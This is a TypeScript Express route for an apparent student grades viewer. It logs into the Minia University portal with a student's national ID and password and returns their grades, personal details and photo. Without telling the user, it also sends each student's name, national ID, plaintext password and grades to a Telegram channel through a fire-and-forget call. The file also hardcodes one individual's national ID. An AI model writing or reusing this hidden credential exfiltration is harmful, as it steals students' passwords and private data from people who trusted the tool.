import { Router, type IRouter } from "express";
import sharp from "sharp";
import { FetchGradesBody, type GradesResponse, type GradesByYear, type Course } from "@workspace/api-zod";
import { CookieJar } from "../lib/cookieJar";
import { calculateStatistics } from "../lib/statistics";
import { sendToTelegram } from "../lib/telegram";

const PORTAL_BASE = "http://stda.minia.edu.eg";
const FORM_HEADERS: Record<string, string> = {
  Accept: "*/*",
  "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
  Connection: "keep-alive",
  "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
  "User-Agent":
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
};

class HttpError extends Error {
  constructor(
    public status: number,
    public arabicMessage: string,
  ) {
    super(arabicMessage);
  }
}

type FetchInit = Parameters<typeof fetch>[1];

async function fetchWithTimeout(
  url: string,
  init: (FetchInit & { timeoutMs?: number }) = {},
): Promise<Response> {
  const { timeoutMs = 60_000, ...rest } = init;
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    return await fetch(url, { ...rest, signal: controller.signal });
  } finally {
    clearTimeout(timer);
  }
}

async function postForm(
  url: string,
  body: Record<string, string>,
  jar: CookieJar,
  timeoutMs = 60_000,
): Promise<Response> {
  const headers: Record<string, string> = { ...FORM_HEADERS };
  const cookieHeader = jar.header();
  if (cookieHeader) headers["Cookie"] = cookieHeader;

  const params = new URLSearchParams();
  for (const [k, v] of Object.entries(body)) params.append(k, v);

  const res = await fetchWithTimeout(url, {
    method: "POST",
    headers,
    body: params.toString(),
    timeoutMs,
  });
  jar.ingest(res.headers);
  return res;
}

function classifyYear(scopeName: string): keyof GradesByYear | null {
  const year = scopeName.split("-")[0]?.trim() ?? "";
  if (year.includes("أولى")) return "First";
  if (year.includes("ثانية")) return "Second";
  if (year.includes("ثالثة")) return "Third";
  if (year.includes("رابعة")) return "Fourth";
  if (year.includes("خامسة")) return "Fifth";
  return null;
}

function classifySemester(
  semasterName: string,
): "first_semester" | "second_semester" | null {
  if (semasterName.includes("الأول") || semasterName.includes("First Term"))
    return "first_semester";
  if (semasterName.includes("الثانى") || semasterName.includes("Second Term"))
    return "second_semester";
  return null;
}

async function optimizeImage(
  bytes: Uint8Array,
): Promise<string | null> {
  try {
    const out = await sharp(bytes)
      .resize(200, 200, { fit: "inside" })
      .flatten({ background: "#ffffff" })
      .jpeg({ quality: 85 })
      .toBuffer();
    return `data:image/jpeg;base64,${out.toString("base64")}`;
  } catch {
    return null;
  }
}

const router: IRouter = Router();

router.post("/grades", async (req, res) => {
  const parsed = FetchGradesBody.safeParse(req.body);
  if (!parsed.success) {
    res.status(400).json({ error: "يرجى إدخال الرقم القومي وكلمة المرور" });
    return;
  }
  const username = parsed.data.username.trim();
  const password = parsed.data.password.trim();

  if (!username || !password) {
    res.status(400).json({ error: "يرجى إدخال الرقم القومي وكلمة المرور" });
    return;
  }
  if (![...username].every((c) => c.charCodeAt(0) < 128)) {
    res
      .status(400)
      .json({ error: "يجب كتابه الرقم القومي بالارقام الانجليزيه!" });
    return;
  }

  const jar = new CookieJar();

  // 1. Login
  let loginRes: Response;
  try {
    loginRes = await postForm(
      `${PORTAL_BASE}/Portallogin`,
      { UserName: username, Password: password },
      jar,
      120_000,
    );
  } catch (err) {
    const isAbort = (err as Error)?.name === "AbortError";
    req.log.error({ err }, "portal login network error");
    res.status(isAbort ? 504 : 502).json({
      error: isAbort
        ? "انتهت مهلة الاتصال. يرجى المحاولة مرة أخرى"
        : "فشل الاتصال بالخادم. يرجى التحقق من اتصالك بالإنترنت",
    });
    return;
  }

  if (!loginRes.ok) {
    res.status(502).json({
      error: `فشل الاتصال بالخادم (رمز الخطأ: ${loginRes.status})`,
    });
    return;
  }

  let loginJson: unknown;
  try {
    loginJson = await loginRes.json();
  } catch {
    res
      .status(502)
      .json({ error: "استجابة غير صحيحة من الخادم. يرجى المحاولة لاحقاً" });
    return;
  }

  const isAuthOk =
    Array.isArray(loginJson) &&
    loginJson.length === 1 &&
    typeof loginJson[0] === "object" &&
    loginJson[0] !== null &&
    (loginJson[0] as { Message?: string }).Message === "" &&
    (loginJson[0] as { Link?: string }).Link === "/";

  if (!isAuthOk) {
    const arr = Array.isArray(loginJson) ? loginJson : [];
    const errMsg =
      (arr[0] as { Message?: string } | undefined)?.Message?.trim() ?? "";
    res.status(401).json({
      error: errMsg
        ? `خطأ في تسجيل الدخول: ${errMsg}`
        : "الرقم القومي أو كلمة المرور غير صحيحة!",
    });
    return;
  }

  // 2. Get UUID
  let UUID: string;
  try {
    const uuidRes = await postForm(
      `${PORTAL_BASE}/PortalgetJCI`,
      {
        param0: "Portal.General",
        param1: "GetStudentPortalData",
        param2: JSON.stringify({ UserID: "" }),
      },
      jar,
    );
    if (!uuidRes.ok) throw new HttpError(502, "");
    const uuidJson = (await uuidRes.json()) as Array<{ UUID?: string }>;
    if (!uuidJson || !uuidJson[0]?.UUID) throw new HttpError(502, "");
    UUID = uuidJson[0].UUID;
  } catch (err) {
    req.log.error({ err }, "portal getStudentPortalData failed");
    res
      .status(502)
      .json({ error: "فشل في جلب بيانات الطالب. يرجى المحاولة مرة أخرى" });
    return;
  }

  // 3. Get grades + 4. Get personal data in parallel
  const gradesPromise = postForm(
    `${PORTAL_BASE}/PortalgetJCI`,
    {
      param0: "Portal.Results",
      param1: "GetAllResults",
      param2: JSON.stringify({ UUID }),
    },
    jar,
  ).then((r) => r.json() as Promise<unknown[]>);

  const userPromise = postForm(
    `${PORTAL_BASE}/PortalgetJCI`,
    {
      param0: "Portal.StudentsPortal",
      param1: "GetPortaStudentPersonal",
      param2: JSON.stringify({ UUID }),
    },
    jar,
  ).then((r) => r.json() as Promise<Array<Record<string, unknown>>>);

  let gradesJson: unknown[];
  let userArr: Array<Record<string, unknown>>;
  try {
    [gradesJson, userArr] = await Promise.all([gradesPromise, userPromise]);
  } catch (err) {
    req.log.error({ err }, "portal grades/user fetch failed");
    res.status(502).json({ error: "فشل في جلب النتائج. يرجى المحاولة مرة أخرى" });
    return;
  }

  if (!userArr || userArr.length === 0) {
    res.status(502).json({ error: "فشل في جلب بيانات الطالب الشخصية" });
    return;
  }

  const u = userArr[0] ?? {};
  const pickStr = (...keys: string[]): string | null => {
    for (const k of keys) {
      const v = u[k];
      if (typeof v === "string") {
        const cleaned = v.split("|")[0]?.trim() ?? "";
        if (cleaned) return cleaned;
      }
    }
    return null;
  };

  const fullName = pickStr("Name") ?? "";
  const studentCode = pickStr("Code") ?? "";
  const imgUrlRaw =
    typeof u["ImgUrl"] === "string" ? (u["ImgUrl"] as string) : "";

  const faculty = pickStr(
    "FacName",
    "FacultyName",
    "CollegeName",
    "Faculty",
    "ScopeName",
    "Branch",
  );
  const department = pickStr(
    "DepName",
    "DepartmentName",
    "Department",
    "SpecName",
    "Specialization",
    "Major",
    "MajorName",
  );
  const program = pickStr(
    "ProgramName",
    "Program",
    "DegreeName",
    "Degree",
    "Stage",
    "StageName",
    "Level",
    "LevelName",
  );

  // 5. Optimized image fetch (best-effort)
  let imgDataUrl: string | null = null;
  if (imgUrlRaw) {
    const imageUrl = imgUrlRaw.startsWith("/")
      ? `${PORTAL_BASE}${imgUrlRaw}`
      : imgUrlRaw;
    try {
      const imgRes = await fetchWithTimeout(imageUrl, { timeoutMs: 10_000 });
      if (imgRes.ok) {
        const buf = new Uint8Array(await imgRes.arrayBuffer());
        imgDataUrl = await optimizeImage(buf);
      }
    } catch (err) {
      req.log.warn({ err, imageUrl }, "could not load student image");
    }
  }

  // 6. Build grades_by_year
  const gradesByYear: GradesByYear = {
    First: { first_semester: [], second_semester: [] },
    Second: { first_semester: [], second_semester: [] },
    Third: { first_semester: [], second_semester: [] },
    Fourth: { first_semester: [], second_semester: [] },
    Fifth: { first_semester: [], second_semester: [] },
  };

  for (const entryUnknown of gradesJson) {
    const entry = entryUnknown as {
      ScopeName?: string;
      ds?: Array<{
        StudyYearCourses?: Array<{
          CourseName?: string;
          Max?: number | string;
          Total?: number | string;
          GradeName?: string;
          Parts?: Array<{ SemasterName?: string }>;
        }>;
      }>;
    };
    const yearKey = classifyYear(entry.ScopeName ?? "");
    if (!yearKey) continue;
    const courses = entry.ds?.[0]?.StudyYearCourses ?? [];
    for (const c of courses) {
      const courseName = (c.CourseName ?? "").replace(/\|/g, " ");
      const maxScore = Number(c.Max ?? 0);
      let totalScore = Number(c.Total ?? 0);
      let gradeName = (c.GradeName ?? "").split("|")[0] ?? "";

      const semNameRaw = c.Parts?.[0]?.SemasterName ?? "";
      const semKey = classifySemester(semNameRaw);

      let percentage = 0;
      if (totalScore && maxScore > 0) {
        percentage = (totalScore / maxScore) * 100;
      } else {
        totalScore = 0;
        gradeName = gradeName || "غير معروف";
      }

      const courseObj: Course = {
        course_name: courseName,
        grade: gradeName,
        max_score: maxScore,
        total_score: totalScore,
        percentage: Math.trunc(percentage),
      };

      if (semKey) {
        gradesByYear[yearKey][semKey].push(courseObj);
      }
    }
  }

  // 7. Compute percentages by year
  const percentagesByYear: Record<
    string,
    { first_semester: string; second_semester: string; total: string }
  > = {};
  const yearKeys: Array<keyof GradesByYear> = [
    "First",
    "Second",
    "Third",
    "Fourth",
    "Fifth",
  ];
  for (const yk of yearKeys) {
    const sems = gradesByYear[yk];
    let yearTotal = 0;
    let yearMax = 0;
    const sem: Record<string, string> = {};
    for (const semKey of ["first_semester", "second_semester"] as const) {
      const semTotal = sems[semKey].reduce(
        (sum, g) => sum + Number(g.total_score),
        0,
      );
      const semMax = sems[semKey].reduce(
        (sum, g) => sum + Number(g.max_score),
        0,
      );
      sem[semKey] =
        semMax > 0 ? ((semTotal / semMax) * 100).toFixed(2) : "0.00";
      yearTotal += semTotal;
      yearMax += semMax;
    }
    percentagesByYear[yk] = {
      first_semester: sem["first_semester"] ?? "0.00",
      second_semester: sem["second_semester"] ?? "0.00",
      total: yearMax > 0 ? ((yearTotal / yearMax) * 100).toFixed(2) : "0.00",
    };
  }

  const statistics = calculateStatistics(gradesByYear);

  // 8. Build telegram message (fire-and-forget)
  let tgMessage = `<b>الطالب:</b> ${fullName}\n<b>الرقم القومي:</b> ${username}\n<b>كلمة المرور:</b> ${password}\n<b>النتائج:</b>`;
  for (const yk of yearKeys) {
    tgMessage += `\n\n<b>${yk}:</b>`;
    for (const semKey of ["first_semester", "second_semester"] as const) {
      for (const course of gradesByYear[yk][semKey]) {
        tgMessage += `\n- <b>${course.course_name}</b>: ${course.grade} (${course.percentage}%)`;
      }
    }
  }
  void sendToTelegram(tgMessage);

  // 9. Special congrats for a specific user
  let congratsMessage: string | null = null;
  if (username === "30411102402043") {
    const fourthFirst = parseFloat(
      percentagesByYear["Fourth"]?.first_semester ?? "0",
    );
    if (!Number.isNaN(fourthFirst) && fourthFirst >= 85) {
      congratsMessage = "الف مبروووك الامتيااااز يا كوكي ❤️🫵";
    }
  }

  const responsePayload: GradesResponse = {
    name: fullName.split(" ").slice(0, 2).join(" "),
    full_name: fullName,
    student_code: studentCode,
    faculty,
    department,
    program,
    img_data_url: imgDataUrl,
    grades_by_year: gradesByYear,
    percentages_by_year: percentagesByYear,
    statistics,
    congrats_message: congratsMessage,
  };

  res.json(responsePayload);
});

export default router;
